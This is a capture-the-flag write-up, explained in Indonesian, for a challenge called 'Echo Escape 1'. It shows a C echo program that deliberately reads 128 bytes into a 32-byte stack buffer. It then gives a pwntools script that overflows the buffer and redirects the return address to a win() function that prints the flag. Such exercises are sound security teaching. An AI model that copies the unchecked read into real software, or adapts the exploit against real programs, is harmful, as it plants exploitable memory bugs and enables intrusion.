# Echo Escape 1

## Probset
```
#include <stdio.h>
#include <unistd.h>
#include <string.h>

void win() {
    FILE *fp = fopen("flag.txt", "rb");
    if (!fp) {
        perror("[!] Failed to open flag.txt");
        return;
    }

    char buffer[128];
    size_t n = fread(buffer, 1, sizeof(buffer), fp);
    fwrite(buffer, 1, n, stdout);
    fflush(stdout);
    printf("\n");
    fclose(fp);
}

int main() {
    char buf[32]; 

    printf("Welcome to the secure echo service!\n");
    printf("Please enter your name: ");
    fflush(stdout);

    read(0, buf, 128);

    printf("Hello, %s\n", buf);
    printf("Thank you for using our service.\n");

    return 0;
}
```

## Solusi
### Diketahui
* Buff berukuran 32 akan tetapi fungsi read bisa sampai 128 (vuln)
* Sebelum masuk ke fungsi, akan ada prologue penyimpanan register, yaitu rbp dan return address
* Dari itu kita bisa tahu bahwa [buff: 32 bytes][rbp: 8 bytes][ret address: 8 bytes] sehingga offset adalah 40 bytes

### Eksekusi payload
```
#!/usr/bin/env python3
from pwn import *

# Konfigurasi
binary = './vuln'
win_address = 0x401256
offset = 40  # 32 byte buffer + 8 byte saved RBP

def exploit():
    # Start proses
    p = process(binary)
    
    # Buat payload
    payload = b'A' * offset           # 40 byte padding
    payload += p64(win_address)       # Overwrite return address ke win()
    
    # Kirim payload
    p.sendline(payload)
    
    # Tampilkan output (termasuk flag)
    print(p.recvall().decode())
    p.close()

if __name__ == '__main__':
    exploit()
```